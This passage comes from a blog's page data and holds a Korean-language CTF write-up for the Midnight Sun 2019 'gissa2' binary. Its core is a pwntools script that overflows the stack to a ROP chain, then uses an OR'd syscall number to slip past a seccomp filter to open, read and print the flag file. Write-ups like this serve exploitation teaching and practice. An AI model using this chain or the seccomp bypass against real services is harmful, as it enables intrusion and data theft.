style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>ROP Gadget</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 64.44444444444444%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAAAsTAAALEwEAmpwYAAAD10lEQVQ4y32QW0xbdRzHf9EZY2KiTyby4EDc5nCBDXZkzjkcDmOcmyHsbDg1C75s4qZRNPNhwoBwdcIWYFHgcMlgpYxLaWm59HRcSrlYGPdyaaGH0pbwL1BhEIpw9jXy5JPf5JtvPvm8fSns0KG3gsKOh3fUnyPgAuUaXqRXsolO3iaC91P6sphobxaRXzpRVi2RdepN2ptEFPz78+SXRDQ5HkClBqKXE4hC6/OIQqrzWyPr0rtj9Pf0MfoC8ZQmRzxc+6t4vC5ZjG7NF0+qUsXQ2kwxrDZdjFRniGea7ohv194SQ+tyRa4mWTzTlCtGNWbrw2pS2o+ohAf0iV6JRqsRmskuNFjaUDpmQNrjZmjt3Wiy9UI704X8UREFoyJapV6op7qgmulColmHGpsROlsPtDYTlNZORGgrQZ916rbXN3xPXYsMbtcCRhYWoJidwr+RXG5gB+hYcGJgyQPZt42ZOceuK7QMY2PnKRYWPfB6V+Hx/Y1IXdUWHUm98fG5jFtx1zv1x34eMR/9vE3Hhavuc1fbWrjvzSbuutHAndIouLO6Gu47Uxt3Y7CP+0rUcuENFdylFjX3o9nEJfQZj8Y01YcHq8oOUHBuYvzB9PjEkKq02JDarPMHq7P4fQ9z+ABFIh+kTONfVyTybyiz+UBlBh+oSOL3KZJ5f0Uif+DhXd5fkczvr0rhAx8knQ+oSo0NUZWcphO6Mtz8sxLp/TVIMyvxrbEcF/TF+KGrGJmP6/GTqQSXHxXjsqEIN3vvI6W/Gtc6CsHrSxDfUYjU/mr80leJK+2FOKYpA33RqcX66l9wuOax4HLCurQI9Zx19yen2wVsb8PscWNkhQFbPkgOaddVWkexJe+AsUWser14sr2FqGYlKEpTWaSyDFeJdmuJ0WEXKqZHhYReg2ByO4Qm24TQ43YIGYPdwr3xAcHklATdtEVod0nCN6ZWoVGyCvrZaaFNshVX2yzl72gqsmk/dziUgvxPENELRPQMEe2hl17ds7v/V7/X/svPEtFz1zqqicLq/5i/qM9b+tpYzq4aS1l0SwF7t+EOO6vLZlc6y1h0828sQp3D3lffZrH6uyyuvYh9pMlk76nz2IeaTBbXXsguiQXstDprJayhxEL8o3oMOy3omR1Cr3UArbODKJnqw9SKHWZpFBMeGxrsQ9BIw5j02NAzM4jx5VnkjXZhyGPDgGMMQ64JDDArPmhSgKINKp+NMUy4XLLV6ZKN85JcYBmUvZs+eWx+Xl5Z35BrZqflVuecvLT2RB6RJJltbspZQ32yfW1Nnna7ZYkxeXxlGRFaxfI/LjmP1Aox0UIAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./18.png\"\n        title=\"./18.png\"\n        src=\"/static/f4f80259b2a16c721a5a779d7f610697/37523/18.png\"\n        srcset=\"/static/f4f80259b2a16c721a5a779d7f610697/e9ff0/18.png 180w,\n/static/f4f80259b2a16c721a5a779d7f610697/f21e7/18.png 360w,\n/static/f4f80259b2a16c721a5a779d7f610697/37523/18.png 720w,\n/static/f4f80259b2a16c721a5a779d7f610697/798d4/18.png 976w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>syscall</p>\n<ul>\n<li>syscallì„ í•  read, open, write ì˜ ì¸ìëŠ” ì´ 3, 2ê°œ ì´ê¸° ë•Œë¬¸ì— rdi, rsi, rdx ë ˆì§€ìŠ¤í„°ê°€ í•„ìš”í•˜ë‹¤.</li>\n<li>í•´ë‹¹ ë¶€ë¶„ì—ì„œ êµ¬í•  ìˆ˜ ìˆëŠ” ê°€ì ¯ì€ ìœ„ ì‚¬ì§„ê³¼ ê°™ìœ¼ë©° í•„ìš”ì—†ëŠ” ë ˆì§€ìŠ¤í„°ëŠ” ì•„ë¬´ ê°’ì´ë‚˜ ë„£ì–´ì£¼ë©´ë˜ê² ë‹¤.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">pop_rdx <span class=\"token operator\">=</span> <span class=\"token number\">0xc1d</span> <span class=\"token operator\">+</span> pie_base\npop_rax_rdi_rsi <span class=\"token operator\">=</span> <span class=\"token number\">0xc21</span> <span class=\"token operator\">+</span> pie_base\nsyscall<span class=\"token operator\">=</span> <span class=\"token number\">0xc45</span> <span class=\"token operator\">+</span> pie_base\n\nROP <span class=\"token operator\">=</span> p8<span class=\"token punctuation\">(</span><span class=\"token number\">0x41</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">168</span>\n\n<span class=\"token comment\"># read(0, bss, len(flag));</span>\nROP <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>pop_rax_rdi_rsi<span class=\"token punctuation\">)</span>\nROP <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>  \t\t\t\t\t\t\t\nROP <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>           \t\t\t\t\nROP <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\t\t\t\t\t\t\t\nROP <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>pop_rdx<span class=\"token punctuation\">)</span>\t\t\nROP <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/home/ctf/flag\\x00\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nROP <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\nROP <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\nROP <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\t\t\t\t\t\t\t\nROP <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>pie_base <span class=\"token operator\">+</span> e<span class=\"token punctuation\">.</span>bss<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>     \t\t\nROP <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>syscall<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># open(bss, 0, 0)</span>\nROP <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>pop_rax_rdi_rsi<span class=\"token punctuation\">)</span>\nROP <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x40000002</span><span class=\"token punctuation\">)</span>  \t\t\t\t\nROP <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>           \t\t\t\t\nROP <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\t\t\t\t\t\t\t\nROP <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>pop_rdx<span class=\"token punctuation\">)</span>\t\t\nROP <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\nROP <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\nROP <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\nROP <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>pie_base <span class=\"token operator\">+</span> e<span class=\"token punctuation\">.</span>bss<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\t\t\t\nROP <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>     \nROP <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>syscall<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># read(3, bss, 0x64)</span>\nROP <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>pop_rax_rdi_rsi<span class=\"token punctuation\">)</span>\nROP <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>  \t\t\t\nROP <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>           \nROP <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\t\t\t\nROP <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>pop_rdx<span class=\"token punctuation\">)</span>\t\t\nROP <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x64</span><span class=\"token punctuation\">)</span>\nROP <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\nROP <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\nROP <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>     \t\t\nROP <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>pie_base <span class=\"token operator\">+</span> e<span class=\"token punctuation\">.</span>bss<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nROP <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>syscall<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># write(1, bss, 0x64)</span>\nROP <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>pop_rax_rdi_rsi<span class=\"token punctuation\">)</span>\nROP <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>  \t\t\t\t\nROP <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>           \t\nROP <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\t\t\t\t\nROP <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>pop_rdx<span class=\"token punctuation\">)</span>\t\t\nROP <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x64</span><span class=\"token punctuation\">)</span>\nROP <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\nROP <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\nROP <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>     \t\t\t\t\t\t\nROP <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>pie_base <span class=\"token operator\">+</span> e<span class=\"token punctuation\">.</span>bss<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\t\t\t\nROP <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>syscall<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">print</span> p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span> ROP<span class=\"token punctuation\">)</span> \n<span class=\"token keyword\">print</span> p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">\"/home/ctf/flag\\x00\"</span><span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre></div>\n<ol>\n<li>ê°€ì ¯ ì£¼ì†Œ êµ¬í•˜ê¸°\n<ul>\n<li>PIE ê°€ ê±¸ë ¤ ìˆê¸° ë•Œë¬¸ì— ì•ì—ì„œ êµ¬í•œ PIE base ì£¼ë¡œë‘ ë”í•´ ì‹¤ì œ ì£¼ì†Œë¡œ ë°”ê¿”ì¤€ë‹¤.</li>\n</ul>\n</li>\n<li>ìŠ¤íƒ ì˜¤ë²„ í”Œë¡œìš°\n<ul>\n<li>ROP Gadget ì£¼ì†Œë¡œ ì´ë™í•˜ê¸° ìœ„í•´ 168 ë°”ì´íŠ¸ì— ìœ„ì¹˜í•˜ëŠ” ë¦¬í„´ ì£¼ì†Œê¹Œì§€ ë”ë¯¸ ê°’ì„ ì±„ì›Œì¤€ë‹¤.</li>\n</ul>\n</li>\n<li>flag íŒŒì¼ ê²½ë¡œ ì…ë ¥ ë°›ê¸°\n<ul>\n<li>ìš°ë¦¬ëŠ” open í•¨ìˆ˜ë¥¼ ìš°íšŒí•˜ì—¬ ì‚¬ìš©ì´ ê°€ëŠ¥í•˜ê¸° ë•Œë¬¸ì—</li>\n<li>flag íŒŒì¼ì˜ ê²½ë¡œê°€ í•„ìš”í•˜ë‹¤ open í•¨ìˆ˜ë¡œ ë°›ê¸°ì—ëŠ” ê¸¸ì´ ê°’ì´ í¬ê¸° ë•Œë¬¸ì— ì§ì ‘ read í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•˜ì—¬ ì…ë ¥ ë°›ì„ ìˆ˜ ìˆë„ë¡ í•œë‹¤.</li>\n<li>ì¤‘ìš”í•œ ì ì€ bss ì˜ì—­ì— write ê¶Œí•œì´ ì¡´ì¬í•˜ê¸° ë•Œë¬¸ì— í•´ë‹¹ ë¶€ë¶„ì— ì…ë ¥í•œë‹¤.</li>\n</ul>\n</li>\n<li>flag íŒŒì¼ open\n<ul>\n<li>seccomp filterë¥¼ ìš°íšŒí•˜ê¸° ìœ„í•´ syscall numì„ 0x40000000ê°€ or ì—°ì‚°í•œ ê°’ì„ ë³´ë‚¸ë‹¤.</li>\n<li>ê·¸ë¦¬ê³  bss ì˜ì—­ì˜ ì²« ë²ˆì§¸ ì£¼ì†Œì— í•´ë‹¹í•˜ëŠ” ê°’ì„ ì½ì–´ ì˜¤ë©´ ëœë‹¤.</li>\n</ul>\n</li>\n<li>flagê°’ ì½ì–´ì˜¤ê¸°\n<ul>\n<li>open í•¨ìˆ˜ì˜ ë°˜í™˜ ê°’ì¸ default ë‹¤ìŒ fdì¸ 3 ë²ˆì§¸ë¥¼ ì‚¬ìš©í•˜ì—¬ ì •ë³´ë¥¼ ì½ì–´ì™€ bss ì˜ì—­ì— ì €ì¥í•œë‹¤.</li>\n</ul>\n</li>\n<li>ì¶œë ¥í•˜ê¸°\n<ul>\n<li>stdout fdì‚¬ìš©í•˜ì—¬ bss ì˜ì—­ì— ì¡´ì¬í•˜ëŠ” flag ê°’ì„ ì¶œë ¥í•œë‹¤.</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"flag\" style=\"position:relative;\"><a href=\"#flag\" aria-label=\"flag permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>flag</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 53.888888888888886%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAAsTAAALEwEAmpwYAAACCUlEQVQoz4WMXWvTUBiA8zvGkrTJyclJ0qY9TZuckzRtmvTDMdb1i4a2WDs2O8vAOVF0OBEdDLwaiKJXTnDgvRc6RPAD1Etv5pX+GElcRUEQHl6e94XnZWhtRhqbduOS1ZgVyiOzvkmDC6Q+zXtjEkxMf2LX11Mk1AptlQ4lrQJkByAXIBsqVYbe+JS5eGSsP8nvvMzPjgs3P+LpM3L7C54dk73P5u6H/NYLa/d9bvrU3v+mLG0tsgscQJwoJiSdKdw6xdfe6RvP8ZXX2tqRce9Hdvskt/e1cOc0e/kV3nlj7n/PXn0rBVN9+ySZorwAeUnlgZyEmNGHj1KD+/roMDN+mA4PMpPHWvN66vwDpXsXemMYbGjDQ7V/AOyuVFnjeD4uEQ9gEmYZQr2cgaEMAQAIIaQgNaXxPMdyHJcUuaTAcizLcXzsvKTE5Tz2al277AsorWFTw6aI0qwgR+8jlJg//Kycx47XrC4tW8WKW6m5fl3RMSfKCUn5H7IAMeOUV6hbxqaj6rmEpAAlzQpwgRcXk9IvWAH+C8CDDOM3el7tnFX0Xb9RCiJoKSBuJU9L2HRyVjFjWLpBYn4L0Q0zWygzy61Rs9NZ7YXtftjqha1+2A4HnXCwtLLq+lXXrxqWbRBqEDsXydwJMajPUKcryBZANlAoQBFiPKNViY6S6kiqA/9GUqmcCn4CKPubk0D56DEAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./19.png\"\n        title=\"./19.png\"\n        src=\"/static/040392dffc9a41955ea159da1a4d82c4/37523/19.png\"\n        srcset=\"/static/040392dffc9a41955ea159da1a4d82c4/e9ff0/19.png 180w,\n/static/040392dffc9a41955ea159da1a4d82c4/f21e7/19.png 360w,\n/static/040392dffc9a41955ea159da1a4d82c4/37523/19.png 720w,\n/static/040392dffc9a41955ea159da1a4d82c4/f0551/19.png 862w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>flagë¥¼ íšë“í•  ìˆ˜ ìˆë‹¤.</li>\n</ul>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EA%B0%9C%EC%9A%94\">ë°”ì´ë„ˆë¦¬ ê°œìš”</a></p>\n<ul>\n<li><a href=\"#%EB%B3%B4%ED%98%B8%EA%B8%B0%EB%B2%95\">ë³´í˜¸ê¸°ë²•</a></li>\n<li><a href=\"#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EC%A0%95%EB%B3%B4\">ë°”ì´ë„ˆë¦¬ ì •ë³´</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EB%B6%84%EC%84%9D\">ë°”ì´ë„ˆë¦¬ ë¶„ì„</a></p>\n</li>\n<li>\n<p><a href=\"#seccomp_mode_filter-list\">SECCOMP_MODE_FILTER LIST</a></p>\n</li>\n<li>\n<p><a href=\"#main-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D\">main í•¨ìˆ˜ ë¶„ì„</a></p>\n</li>\n<li>\n<p><a href=\"#sub_91e-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D\">sub_91E í•¨ìˆ˜ ë¶„ì„</a></p>\n</li>\n<li>\n<p><a href=\"#integer-issue\">Integer Issue</a></p>\n</li>\n<li>\n<p><a href=\"#%EB%A9%94%EB%AA%A8%EB%A6%AC-%EC%A3%BC%EC%86%8C-%EB%85%B8%EC%B6%9C-%EC%8A%A4%ED%83%9D-%EB%B2%84%ED%8D%BC-%EC%98%A4%EB%B2%84%ED%94%8C%EB%9F%AC%EC%9A%B0\">ë©”ëª¨ë¦¬ ì£¼ì†Œ ë…¸ì¶œ, ìŠ¤íƒ ë²„í¼ ì˜¤ë²„í”ŒëŸ¬ìš°</a></p>\n</li>\n<li>\n<p><a href=\"#64bit-rop\">64bit ROP</a></p>\n</li>\n<li>\n<p><a href=\"#seccomp_filter_mode-%EC%9A%B0%ED%9A%8C\">seccomp_filter_mode ìš°íšŒ</a></p>\n</li>\n<li>\n<p><a href=\"#64bit-rop-1\">64bit ROP</a></p>\n</li>\n<li>\n<p><a href=\"#flag\">flag</a></p>\n</li>\n</ul>\n</div>","frontmatter":{"date":"September 18, 2020","title":"Midnight sun 2019 gissa2 ì·¨ì•½ì  ë¶„ì„","categories":"CTF","author":"Zer0Luck","emoji":"ğŸ¥™"},"fields":{"slug":"/midnightsun_gissa2_ctf_writeup/"}},"site":{"siteMetadata":{"siteUrl":"https://dnsdudrla97.github.io","comments":{"utterances":{"repo":"dnsdudrla97/dnsdudrla97.github.io"}}}}},"pageContext":{"slug":"/csaw_small_boi_ctf_writeup/","nextSlug":"/defcon2016_xkcd_ctf_writeup/","prevSlug":"/midnightsun_gissa2_ctf_writeup/"}},
    "staticQueryHashes": ["1073350324","1956554647","2938748437"]}